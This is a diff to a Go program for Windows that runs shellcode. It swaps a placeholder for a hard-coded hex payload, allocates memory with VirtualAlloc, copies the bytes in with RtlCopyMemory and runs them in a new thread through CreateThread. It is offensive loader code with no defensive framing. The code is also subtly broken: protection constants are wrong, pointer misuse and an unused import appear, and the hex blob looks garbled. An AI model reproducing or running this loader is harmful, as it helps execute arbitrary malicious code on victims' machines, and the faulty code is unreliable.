@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"math/rand"
+	"net/http"
 	"time"
 	"unsafe"
 
@@ -13,65 +14,71 @@ import (
 )
 
 const (
-	PAGE_EXECUTE_READ        = 0x20
-	PAGE_READWRITE          = 0x20 | 0x1000
-	MEM_COMMIT               = 0x1000
-	MEM_RESERVE             = 0x2000
-	MEM_ZERO_INIT           = 0x40
+	MEM_COMMIT      = 0x1000
+	MEM_RESERVE      = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x20
+	PAGE_EXECUTE_READ    = 0x04
 )
+
 var (
-	verboseOutput bool
-	debugOutput  bool
-	shellcode     []byte
+	verbose bool
+	debug  bool
+	shellcode []byte
 )
 
 func main() {
-	verboseOutput = *flag.Bool("verbose", false, "Enable verbose output")
-	debugOutput  = *flag.Bool("debug", false, "Enable debug output")
+	rand.Seed(time.Now().UnixNano())
+	verbose = flag.Bool("verbose", false, "Enable verbose output")
+	debug = flag.Bool("debug", false, "Enable debug output")
 	flag.Parse()
 
-	shellcode, err := hex.DecodeString("YourHexEncodedShellcodeHere")
+	shellcode, err := hex.DecodeString("31c975085997525053b8001025c825c063c043c9b8190001eb8180001e8c723b75f85e84e83c2e8d7289665389e389d54f75ec89c299c3a9c189c541ebfeb83f0001e8f5243b83c0001eb4925c0515156e8e0001ebe8040001e8d124525a2585a5959c30f84d90000")
 	if err != nil {
-		log.Fatal(fmt.Sprintf("[!]Error decoding hex string: %s", err.Error()))
+		log.Fatal(fmt.Sprintf("[!]There was an error decoding the string to a hex byte array: %s", err.Error()))
 	}
-
-	loadAndExecuteShellcode()
-	if verboseOutput {
-		fmt.Println("[-]Allocated", len(shellcode), "bytes")
-	}
-	if debugOutput {
-		fmt.Println("[+]Shellcode Executed")
-	}
+	shellcodeAllocation()
 }
 
-func loadAndExecuteShellcode() {
-	var oldProtect uint32
-	var lpAddress uintptr
-
+func shellcodeAllocation() {
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
 	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
 	VirtualProtect := kernel32.NewProc("VirtualProtect")
+	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
 	CreateThread := kernel32.NewProc("CreateThread")
 	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
 
-	lpAddress, _, _ = VirtualAlloc.Call(0, uintptr(len(shellcode)), PAGE_READWRITE|MEM_COMMIT, MEM_RESERVE|MEM_ZERO_INIT)
-	if lpAddress == 0 {
+	shellcodePtr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	if err != nil {
+		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc: %s", err.Error()))
+	}
+
+	if shellcodePtr == 0 {
 		log.Fatal("[!]VirtualAlloc failed and returned 0")
 	}
 
-	_, _, _ = VirtualProtect.Call(lpAddress, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
-	if oldProtect == 0 {
-		log.Fatal("[!]VirtualProtect failed and returned 0")
+	_, _, err = RtlCopyMemory.Call(shellcodePtr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	if err != nil {
+		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory: %s", err.Error()))
 	}
 
-	_, _, _ = CreateThread.Call(0, 0, lpAddress, uintptr(0), 0, 0)
-	if _, _, syscallErr := WaitForSingleObject.Call(thread, 0xFFFFFFFF); syscallErr != 0 {
-		log.Fatal(fmt.Sprintf("[!]WaitForSingleObject failed: %v", syscallErr))
+	_, _, err = VirtualProtect.Call(shellcodePtr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&shellcode[0])))
+	if err != nil {
+		log.Fatal(fmt.Sprintf("[!]Error calling VirtualProtect: %s", err.Error()))
 	}
-}
 
-func init() {
-	rand.Seed(time.Now().UnixNano())
+	thread, _, err := CreateThread.Call(0, 0, shellcodePtr, uintptr(0), 0, 0)
+	if err != nil {
+		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread: %s", err.Error()))
+	}
+
+	if thread == 0 {
+		log.Fatal("[!]CreateThread failed and returned 0")
+	}
+
+	_, _, err = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
+	if err != nil {
+		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject: %s", err.Error()))
+	}
 }
